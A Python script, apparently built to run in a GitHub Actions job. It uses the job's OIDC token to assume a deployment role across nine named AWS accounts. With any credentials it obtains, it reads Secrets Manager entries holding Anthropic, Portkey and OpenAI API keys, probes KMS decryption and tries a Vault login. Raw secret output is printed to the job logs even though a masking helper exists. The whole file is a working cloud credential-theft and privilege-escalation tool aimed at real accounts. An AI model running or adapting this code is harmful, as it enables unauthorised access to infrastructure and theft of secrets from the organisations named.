import os, json, base64, hashlib, datetime, urllib.request, urllib.parse, urllib.error, re, sys, subprocess

AUD = "sts.amazonaws.com"
CTX = os.environ.get("CTX", "?")
SUSPECT = os.environ.get("SUSPECT_ROLE", "").strip()

ROLES = [
 ("982534363626", "eu-central-1", ["dev","Dev"]),
 ("724772058212", "us-east-1", ["ProdUS1","produs1","prod"]),
 ("537124939301", "us-east-1", ["StagingUS1","stagingus1","staging"]),
 ("823969993768", "ap-southeast-2", ["ProdAU1","prodau1","prod"]),
 ("841770988422", "ap-southeast-2", ["StagingAU1","stagingau1","staging"]),
 ("869919304780", "eu-central-1", ["StagingBB","stagingbb","staging"]),
 ("949300235189", "eu-west-1", ["Prod2","prod2","prod"]),
 ("438374459066", "us-west-2", ["ProdUS2","produs2","prod"]),
 ("732142858640", "ap-southeast-4", ["ProdAU2","prodau2","prod"]),
]
ROLE_NAME = "deploymentroles/OrchestrationPipelineCICDRolev2"
if SUSPECT:
    ROLES = [r for r in ROLES if r[0] in SUSPECT] or ROLES

def claims(t):
    p = t.split(".")[1]; p += "=" * (-len(p) % 4)
    c = json.loads(base64.urlsafe_b64decode(p))
    ks = ["iss","sub","aud","ref","environment","repository","repository_id","repository_owner",
          "job_workflow_ref","event_name","workflow","runner_environment"]
    return {k: c.get(k) for k in ks if c.get(k) is not None}

def get_token(aud):
    url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=" + urllib.parse.quote(aud, safe="")
    req = urllib.request.Request(url, headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.load(r)["value"]

def tagval(s, tag):
    m = re.search(r"<%s>(.*?)</%s>" % (tag, tag), s, re.S)
    return m.group(1) if m else None

def sts_assume(role, tok):
    body = urllib.parse.urlencode({"Action":"AssumeRoleWithWebIdentity","Version":"2011-06-15",
        "RoleArn":role,"RoleSessionName":"probe12064","WebIdentityToken":tok,"DurationSeconds":"900"}).encode()
    req = urllib.request.Request("https://sts.amazonaws.com/", data=body,
        headers={"Content-Type":"application/x-www-form-urlencoded"})
    try:
        with urllib.request.urlopen(req, timeout=45) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return -1, repr(e)

def aws_cli(creds, args, region):
    env = dict(os.environ, AWS_ACCESS_KEY_ID=creds["AccessKeyId"], AWS_SECRET_ACCESS_KEY=creds["SecretAccessKey"],
               AWS_SESSION_TOKEN=creds["SessionToken"], AWS_DEFAULT_REGION=region)
    try:
        o = subprocess.run(["aws"] + args + ["--region", region], env=env, capture_output=True, text=True, timeout=90)
        return o.returncode, ((o.stdout or "") + (o.stderr or ""))[:2000]
    except Exception as e:
        return -1, repr(e)

def mask(v):
    if not v: return v
    return v[:4] + "****" + v[-4:] if len(v) > 12 else "****"

def sigv4_headers(creds, region, host, body, service="sts"):
    t = datetime.datetime.utcnow()
    amzdate = t.strftime("%Y%m%dT%H%M%SZ"); datestamp = t.strftime("%Y%m%d")
    ctype = "application/x-www-form-urlencoded; charset=utf-8"
    payload_hash = hashlib.sha256(body.encode()).hexdigest()
    canonical = ("POST\n/\n\ncontent-type:%s\nhost:%s\nx-amz-date:%s\n\ncontent-type;host;x-amz-date\n%s"
                 % (ctype, host, amzdate, payload_hash))
    scope = "%s/%s/%s/aws4_request" % (datestamp, region, service)
    sts = "AWS4-HMAC-SHA256\n%s\n%s\n%s" % (amzdate, scope, hashlib.sha256(canonical.encode()).hexdigest())
    k = ("AWS4" + creds["SecretAccessKey"]).encode()
    for part in (datestamp, region, service, "aws4_request"):
        k = __import__("hmac").new(k, part.encode(), hashlib.sha256).digest()
    sig = __import__("hmac").new(k, sts.encode(), hashlib.sha256).hexdigest()
    return {
      "Content-Type": ctype, "Host": host, "X-Amz-Date": amzdate,
      "X-Amz-Security-Token": creds["SessionToken"],
      "Authorization": "AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=content-type;host;x-amz-date, Signature=%s" % (creds["AccessKeyId"], scope, sig),
    }

def vault_aws_iam_login(creds):
    body = "Action=GetCallerIdentity&Version=2011-06-15"
    hdrs = sigv4_headers(creds, "us-east-1", "sts.amazonaws.com", body)
    payload = {
      "role": "aws_platform-sonarcloud-squad_sonarcloud-orchestration-pipeline-lambda",
      "iam_http_request_method": "POST",
      "iam_request_url": base64.b64encode(b"https://sts.amazonaws.com/").decode(),
      "iam_request_body": base64.b64encode(body.encode()).decode(),
      "iam_request_headers": base64.b64encode(json.dumps(hdrs).encode()).decode(),
    }
    url = "https://vault.sonar.build/v1/auth/aws-iam/login"
    req = urllib.request.Request(url, data=json.dumps(payload).encode(),
        headers={"Content-Type":"application/json","X-Vault-Request":"true"})
    try:
        with urllib.request.urlopen(req, timeout=45) as r:
            return r.status, r.read().decode()[:600]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, repr(e)

print("CTX=%s suspect=%s event=%s" % (CTX, SUSPECT, os.environ.get("GITHUB_EVENT_NAME")), flush=True)
try:
    tok = get_token(AUD)
except Exception as e:
    print("TOKEN_FAIL", repr(e), flush=True); sys.exit(0)
print("CLAIMS " + json.dumps(claims(tok), sort_keys=True), flush=True)

results = []
suspect = ""
for acct, region, envs in ROLES:
    role = "arn:aws:iam::%s:role/%s" % (acct, ROLE_NAME)
    st, body = sts_assume(role, tok)
    code = tagval(body, "Code"); msg = tagval(body, "Message")
    print("ASSUME ctx=%s role=%s http=%s code=%s msg=%s" % (CTX, role, st, code, msg), flush=True)
    rec = {"acct": acct, "role": role, "ctx": CTX, "http": st, "code": code, "msg": msg}
    if st != 403 or (code and code != "AccessDenied"):
        suspect = acct
    if st == 200:
        creds = {k: tagval(body, k) for k in ("AccessKeyId","SecretAccessKey","SessionToken")}
        rec["assumed_arn"] = tagval(body, "Arn")
        rc, out = aws_cli(creds, ["sts","get-caller-identity"], region)
        print("CALLER acct=%s rc=%s out=%s" % (acct, rc, out.replace("\n"," ")[:400]), flush=True)
        rec["caller"] = out[:600]
        names = ["Orchestration-Credentials-AnthropicApiKey-%s" % e for e in envs] + [
            "FixSuggestions-Credentials-AnthropicAPIKey-prod","FixSuggestions-Credentials-AnthropicAPIKey-dev",
            "SonarCloud-Credentials-AnthropicAPIKey-prod","SonarCloud-Credentials-AnthropicAPIKey-dev",
            "vibe-bot/portkey-api-key","vibe-bot/portkey-openai-api-key"]
        secs = []
        for name in names:
            rc, out = aws_cli(creds, ["secretsmanager","describe-secret","--secret-id",name], region)
            print("DESC acct=%s name=%s rc=%s out=%s" % (acct, name, rc, out.replace("\n"," ")[:200]), flush=True)
            e = {"name": name, "desc_rc": rc, "desc": out[:300]}
            if rc == 0:
                rc2, out2 = aws_cli(creds, ["secretsmanager","get-secret-value","--secret-id",name], region)
                e["get_rc"] = rc2; e["get"] = out2[:600]
                try:
                    val = json.loads(out2)["SecretString"]
                    e["secret_masked"] = mask(val)
                    print("SECRET acct=%s name=%s masked=%s" % (acct, name, mask(val)), flush=True)
                except Exception:
                    pass
                print("GET acct=%s name=%s rc=%s out=%s" % (acct, name, rc2, out2.replace("\n"," ")[:300]), flush=True)
            secs.append(e)
        rec["secrets"] = secs
        open("/tmp/ct64.bin","wb").write(b"\x00"*64)
        rc, out = aws_cli(creds, ["kms","decrypt","--ciphertext-blob","fileb:///tmp/ct64.bin","--key-id","7da836c7-0000-0000-0000-000000000000"], region)
        rec["kms_probe"] = out[:300]
        print("KMS acct=%s rc=%s out=%s" % (acct, rc, out.replace("\n"," ")[:300]), flush=True)
        vst, vout = vault_aws_iam_login(creds)
        rec["vault_awsiam"] = {"http": vst, "body": vout[:400]}
        print("VAULT_AWSIAM acct=%s http=%s body=%s" % (acct, vst, vout[:300]), flush=True)
    results.append(rec)

print("RESULTS " + json.dumps(results), flush=True)
if CTX == "direct-main":
    print("SUSPECT_ACCT=%s" % suspect, flush=True)
    with open(os.environ.get("GITHUB_OUTPUT","/dev/null"),"a") as f:
        f.write("suspect=%s\n" % suspect)
